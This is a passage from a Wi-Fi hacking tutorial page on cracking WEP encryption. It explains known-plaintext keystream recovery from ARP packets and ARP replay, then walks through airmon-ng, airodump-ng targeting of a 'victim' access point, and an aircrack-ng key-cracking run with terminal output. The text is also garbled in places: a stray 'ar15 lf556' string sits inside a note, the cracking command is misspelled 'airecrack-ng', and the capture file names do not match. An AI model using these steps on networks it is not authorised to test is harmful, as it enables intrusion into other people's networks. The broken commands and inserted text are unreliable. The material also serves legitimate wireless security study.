 PlainText --&gt; XOR
 XOR --&gt; Keystream&lt;/pre&gt;
&lt;template&gt;graph TD
 Ciphertext["Ciphertext: na1b2c3d4e5f67890=="]
 PlainText["Plain Text: GET / HTTP 1.1\nHost: google.com"]
 XOR["XOR Operation"]
 Keystream["Keystream:&lt;br&gt;1101101010110010101&lt;br&gt;1001010110010101"]

 Ciphertext --&gt; XOR
 PlainText --&gt; XOR
 XOR --&gt; Keystream&lt;/template&gt;&lt;p&gt;The first practical step is capturing ciphertext, which is relatively straightforward. By setting your wireless interface to monitor mode, you can passively listen to all wireless traffic in range. This allows you to capture encrypted packets — including ARP requests and broadcast messages — without needing to be connected to the network. These packets become the foundation for further steps like traffic injection, keystream recovery, and ultimately key extraction.&lt;/p&gt;
&lt;p&gt;This methodology is central to WEP cracking and sets the stage for more advanced techniques, such as ARP replay attacks and dictionary-based keystream matching, which exploit predictable plaintext to speed up the attack process.&lt;/p&gt;
&lt;h3 class="heading-element" id="capture-ciphertext"&gt;&lt;span&gt;29.1 Capture Ciphertext&lt;/span&gt;
 &lt;a href="#capture-ciphertext" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;p&gt;Capturing ciphertext is relatively simple.
By setting the network adapter to monitor mode, it becomes possible to listen to and collect wireless data packets transmitted over the air.&lt;/p&gt;
&lt;h3 class="heading-element" id="retrieve-plaintext"&gt;&lt;span&gt;29.2 Retrieve Plaintext&lt;/span&gt;
 &lt;a href="#retrieve-plaintext" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;p&gt;Extracting the plaintext from encrypted packets is a more complex task. Fortunately, the ARP (Address Resolution Protocol) provides useful assistance in this process. ARP operates with two primary packet types: requests and replies. An ARP request is essentially a broadcast message that asks for the MAC address corresponding to a specific IP on the local network — for instance, “Who has IP 10.20.242.34?” In turn, the device with that IP responds with an ARP reply, sharing its MAC address, such as “I have 10.20.242.34, MAC address e4:35:54:ad:4f:45.”&lt;/p&gt;
&lt;p&gt;A key point is that both ARP request and reply packets contain a header of fixed, predictable length — 16 bytes. By capturing these packets, it is possible to know part of the plaintext in advance. This known plaintext can then be used to recover the initial bytes of the encryption keystream. Therefore, capturing a large number of ARP packets significantly aids the decryption effort.&lt;/p&gt;
&lt;p&gt;However, the attack demands a substantial volume of packets — on the order of 10,000 — to be effective. Such high traffic is typically found only on busy networks, making it challenging to gather enough data. To address this limitation, attackers often resort to an ARP replay technique.&lt;/p&gt;
&lt;h3 class="heading-element" id="arp-replay-attack"&gt;&lt;span&gt;29.3 Arp Replay attack&lt;/span&gt;
 &lt;a href="#arp-replay-attack" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;p&gt;With an ARP replay attack, an adversary captures an ARP request and repeatedly injects it into the network. This forces the client or network devices to generate many packets, each with new initialization vectors and keystream fragments. By collecting these replayed packets, the attacker gains access to a wealth of encrypted data that can be analyzed. For example, sending a single ARP request repeatedly in a network with one client can produce multiple keystream samples to capture and exploit.&lt;/p&gt;
&lt;pre class="mermaid"&gt;graph TD
 Capture["Capture Network Packets"]
 ARP_Packets["Identify ARP Packets"]
 ARP_Request["ARP Request Packet\n(e.g. Who has 10.20.242.34?)"]
 ARP_Reply["ARP Reply Packet\n(e.g. I have 10.20.242.34\nMAC: e4:35:54:ad:4f:45)"]
 Predictable_Header["Known 16-byte Header"]
 Extract_Keystream["Extract First 16 Bytes of Keystream"]
 Use_Keystream["Use Keystream to Decrypt Other Packets"]

 Capture --&gt; ARP_Packets
 ARP_Packets --&gt; ARP_Request
 ARP_Packets --&gt; ARP_Reply
 ARP_Request --&gt; Predictable_Header
 ARP_Reply --&gt; Predictable_Header
 Predictable_Header --&gt; Extract_Keystream
 Extract_Keystream --&gt; Use_Keystream&lt;/pre&gt;
&lt;template&gt;graph TD
 Capture["Capture Network Packets"]
 ARP_Packets["Identify ARP Packets"]
 ARP_Request["ARP Request Packet\n(e.g. Who has 10.20.242.34?)"]
 ARP_Reply["ARP Reply Packet\n(e.g. I have 10.20.242.34\nMAC: e4:35:54:ad:4f:45)"]
 Predictable_Header["Known 16-byte Header"]
 Extract_Keystream["Extract First 16 Bytes of Keystream"]
 Use_Keystream["Use Keystream to Decrypt Other Packets"]

 Capture --&gt; ARP_Packets
 ARP_Packets --&gt; ARP_Request
 ARP_Packets --&gt; ARP_Reply
 ARP_Request --&gt; Predictable_Header
 ARP_Reply --&gt; Predictable_Header
 Predictable_Header --&gt; Extract_Keystream
 Extract_Keystream --&gt; Use_Keystream&lt;/template&gt;&lt;h2 class="heading-element" id="exploiting-wep"&gt;&lt;span&gt;30 Exploiting WEP&lt;/span&gt;
 &lt;a href="#exploiting-wep" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;p&gt;To sniff packets on a network without being connected, you need to switch your wireless adapter into &lt;strong&gt;monitor mode&lt;/strong&gt;. This special mode allows the adapter to capture all wireless traffic in its vicinity, unlike the default managed mode which only processes packets addressed to your device. Monitor mode is essential for tasks such as network analysis and packet sniffing.&lt;/p&gt;
&lt;p&gt;First, you need to identify the wireless adapter you want to use. You can do this by running the command &lt;code&gt;iwconfig&lt;/code&gt;, which lists all wireless interfaces and their current modes. Once you know the adapter’s name (for example, &lt;code&gt;wlan0&lt;/code&gt;), you can change its mode from managed to monitor using the command &lt;code&gt;sudo airmon-ng start wlan0&lt;/code&gt;.&lt;/p&gt;
&lt;div class="alert alert-note"&gt;&lt;p class="alert-title"&gt;&lt;svg class="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16"&gt;&lt;path d="M0 8a8 8 0 1116 0A8 8 0 010 8zm8-6.5a6.5 6.5.0 100 13 6.5 6.5.0 000-13zM6.5 7.75A.75.75.0 017.25 7h1a.75.75.0 01.75.75v2.75h.25a.75.75.0 010 1.5h-2a.75.75.0 010-1.5h.25v-2h-.25a.75.75.0 01-.75-.75zM8 6a1 1 0 110-2 1 1 0 010 2z"/&gt;&lt;/svg&gt;Note&lt;/p&gt;&lt;p&gt;On some wireless adapters, enabling monitor mode creates a new interface with a &lt;code&gt;mon&lt;/code&gt; suffix (e.g., &lt;code&gt;wlan0mon&lt;/code&gt;). However, some adapters, like the Realtek RTL8814AU, enable monitor mode directly on the existing interface without renaming it.ar15 lf556ar15 lf556&lt;/p&gt;&lt;/div&gt;&lt;p&gt;After switching to monitor mode, you can verify that the change was successful by running &lt;code&gt;iwconfig&lt;/code&gt; again. This will show the new mode and the updated interface name. When you are done with packet sniffing and want to revert to the standard managed mode, you can stop monitor mode by running &lt;code&gt;sudo airmon-ng stop wlan0&lt;/code&gt; (or the appropriate interface name). This will restore your adapter to its normal state, ready to connect to networks as usual.&lt;/p&gt;
&lt;p&gt;Switching to monitor mode is a powerful technique that gives you deep insight into wireless traffic around you, but remember to always use it responsibly and respect privacy and legal guidelines.&lt;/p&gt;
&lt;h3 class="heading-element" id="case-1-capturing-packets-wep-passive-attack"&gt;&lt;span&gt;30.1 Case 1: Capturing Packets (WEP Passive Attack)&lt;/span&gt;
 &lt;a href="#case-1-capturing-packets-wep-passive-attack" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;p&gt;As remembered from our discussion above, we know that we need to get keystreams along with different IVs, and to achieve this, we need both ciphertext and plaintext. To obtain plaintext data, we will make use of ARP packets. So, let’s capture those packets. In this example, we are assuming the network is busy, so we will not combine this with an ARP replay attack and will simply try to get as many keystreams as possible.&lt;/p&gt;
&lt;p&gt;First, change your network adapter mode to monitor. You can do this by running the following command, replacing &lt;code&gt;wlan0&lt;/code&gt; with your adapter’s monitor mode interface name if different&lt;/p&gt;
&lt;p&gt;Once this is done, use &lt;code&gt;airodump-ng&lt;/code&gt; followed by the name of the adapter to list all available Access Points nearby. You will see a list of networks, and you need to identify the ones where the ENC used is WEP.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;span class="lnt"&gt;14
&lt;/span&gt;&lt;span class="lnt"&gt;15
&lt;/span&gt;&lt;span class="lnt"&gt;16
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;┌──&lt;span class="o"&gt;(&lt;/span&gt;proxygeek㉿VMware-kali&lt;span class="o"&gt;)&lt;/span&gt;-&lt;span class="o"&gt;[&lt;/span&gt;~&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└─$ sudo airodump-ng wlan0
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; CH &lt;span class="m"&gt;14&lt;/span&gt; &lt;span class="o"&gt;][&lt;/span&gt; Elapsed: &lt;span class="m"&gt;36&lt;/span&gt; s &lt;span class="o"&gt;][&lt;/span&gt; 2025-06-01 20:36 &lt;span class="o"&gt;][&lt;/span&gt; enabled AP selection 
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; BSSID PWR Beacons &lt;span class="c1"&gt;#Data, #/s CH MB ENC CIPHER AUTH ESSID &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;... 
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; XX:XX:XX:XX:XX:XX -28 &lt;span class="m"&gt;57&lt;/span&gt; &lt;span class="m"&gt;2256&lt;/span&gt; &lt;span class="m"&gt;29&lt;/span&gt; &lt;span class="m"&gt;3&lt;/span&gt; &lt;span class="m"&gt;54&lt;/span&gt; WEP WEP wifi-old 
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; BSSID STATION PWR Rate Lost Frames Notes Probes
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; XX:XX:XX:XX:XX:X XX:XX:XX:XX:XX:XX -29 &lt;span class="m"&gt;54&lt;/span&gt; -54 &lt;span class="m"&gt;1737&lt;/span&gt; &lt;span class="m"&gt;2252&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="o"&gt;(&lt;/span&gt;not associated&lt;span class="o"&gt;)&lt;/span&gt; XX:XX:XX:XX:XX:XX -49 &lt;span class="m"&gt;0&lt;/span&gt; - &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="m"&gt;2&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="o"&gt;(&lt;/span&gt;not associated&lt;span class="o"&gt;)&lt;/span&gt; XX:XX:XX:XX:XX:XX -49 &lt;span class="m"&gt;0&lt;/span&gt; - &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="m"&gt;2&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; ...&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;In my case, the Access Point named &lt;code&gt;wifi-old&lt;/code&gt; is using a WEP connection. Now we will capture packets from this target network.
To do so, run the following command to capture packets, replacing the BSSID and channel with those of the victim network:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;┌──&lt;span class="o"&gt;(&lt;/span&gt;proxygeek㉿VMware-kali&lt;span class="o"&gt;)&lt;/span&gt;-&lt;span class="o"&gt;[&lt;/span&gt;~&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└─$ sudo airodump-ng --bssid &amp;lt;target-BSSID&amp;gt; -c &amp;lt;channel&amp;gt; -w wep.cap wlan0
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;CH &lt;span class="m"&gt;3&lt;/span&gt; &lt;span class="o"&gt;][&lt;/span&gt; Elapsed: &lt;span class="m"&gt;24&lt;/span&gt; s &lt;span class="o"&gt;][&lt;/span&gt; 2025-06-01 20:41 
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; BSSID PWR RXQ Beacons &lt;span class="c1"&gt;#Data, #/s CH &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; XX:XX:XX:XX:XX:XX -28 &lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="m"&gt;268&lt;/span&gt; &lt;span class="m"&gt;10561&lt;/span&gt; &lt;span class="m"&gt;384&lt;/span&gt; &lt;span class="m"&gt;3&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; BSSID STATION PWR Rate 
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; XX:XX:XX:XX:XX:XX XX:XX:XX:XX:XX:XX -29 &lt;span class="m"&gt;54&lt;/span&gt; -54 &lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="m"&gt;10534&lt;/span&gt; &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;The &lt;code&gt;--write&lt;/code&gt; option saves all captured packets to the specified file. Capture around 10,000 packets; the capture file will be saved in your current working directory.
After you have enough packets, run &lt;code&gt;airecrack-ng&lt;/code&gt; with the capture file to try and recover the password:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;span class="lnt"&gt;14
&lt;/span&gt;&lt;span class="lnt"&gt;15
&lt;/span&gt;&lt;span class="lnt"&gt;16
&lt;/span&gt;&lt;span class="lnt"&gt;17
&lt;/span&gt;&lt;span class="lnt"&gt;18
&lt;/span&gt;&lt;span class="lnt"&gt;19
&lt;/span&gt;&lt;span class="lnt"&gt;20
&lt;/span&gt;&lt;span class="lnt"&gt;21
&lt;/span&gt;&lt;span class="lnt"&gt;22
&lt;/span&gt;&lt;span class="lnt"&gt;23
&lt;/span&gt;&lt;span class="lnt"&gt;24
&lt;/span&gt;&lt;span class="lnt"&gt;25
&lt;/span&gt;&lt;span class="lnt"&gt;26
&lt;/span&gt;&lt;span class="lnt"&gt;27
&lt;/span&gt;&lt;span class="lnt"&gt;28
&lt;/span&gt;&lt;span class="lnt"&gt;29
&lt;/span&gt;&lt;span class="lnt"&gt;30
&lt;/span&gt;&lt;span class="lnt"&gt;31
&lt;/span&gt;&lt;span class="lnt"&gt;32
&lt;/span&gt;&lt;span class="lnt"&gt;33
&lt;/span&gt;&lt;span class="lnt"&gt;34
&lt;/span&gt;&lt;span class="lnt"&gt;35
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;┌──&lt;span class="o"&gt;(&lt;/span&gt;proxygeek㉿VMware-kali&lt;span class="o"&gt;)&lt;/span&gt;-&lt;span class="o"&gt;[&lt;/span&gt;~&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└─$ sudo airecrack-ng wep.cap
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Reading packets, please wait...
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Opening capture-01.cap
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Read &lt;span class="m"&gt;24937&lt;/span&gt; packets.
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="c1"&gt;# BSSID Got 24776 out of 20000 IVsStarting PTW attack with 24776 ivs.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;1&lt;/span&gt; XX:XX:XX:XX:XX:XX &amp;lt;ESSID&amp;gt; WEP &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;24776&lt;/span&gt; IVs&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Choosing first network as target.
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Reading packets, please wait...
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Opening capture-01.cap
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Read &lt;span class="m"&gt;24937&lt;/span&gt; packets.
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;1&lt;/span&gt; potential targets
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Attack will be restarted every &lt;span class="m"&gt;5000&lt;/span&gt; captured ivs.
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; Aircrack-ng 1.7 
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="o"&gt;[&lt;/span&gt;00:00:00&lt;span class="o"&gt;]&lt;/span&gt; Tested &lt;span class="m"&gt;6&lt;/span&gt; keys &lt;span class="o"&gt;(&lt;/span&gt;got &lt;span class="m"&gt;24776&lt;/span&gt; IVs&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; KB depth byte&lt;span class="o"&gt;(&lt;/span&gt;vote&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;0&lt;/span&gt; 0/ &lt;span class="m"&gt;1&lt;/span&gt; XX&lt;span class="o"&gt;(&lt;/span&gt;35840&lt;span class="o"&gt;)&lt;/span&gt; XX&lt;span class="o"&gt;(&lt;/span&gt;32256&lt;span class="o"&gt;)&lt;/span&gt; XX&lt;span class="o"&gt;(&lt;/span&gt;30208&lt;span class="o"&gt;)&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;1&lt;/span&gt; 0/ &lt;span class="m"&gt;5&lt;/span&gt; XX&lt;span class="o"&gt;(&lt;/span&gt;32000&lt;span class="o"&gt;)&lt;/span&gt; XX&lt;span class="o"&gt;(&lt;/span&gt;31232&lt;span class="o"&gt;)&lt;/span&gt; XX&lt;span class="o"&gt;(&lt;/span&gt;31232&lt;span class="o"&gt;)&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;2&lt;/span&gt; 0/ &lt;span class="m"&gt;1&lt;/span&gt; XX&lt;span class="o"&gt;(&lt;/span&gt;34816&lt;span class="o"&gt;)&lt;/span&gt; XX&lt;span class="o"&gt;(&lt;/span&gt;31232&lt;span class="o"&gt;)&lt;/span&gt; XX&lt;span class="o"&gt;(&lt;/span&gt;30976&lt;span class="o"&gt;)&lt;/span&gt; 
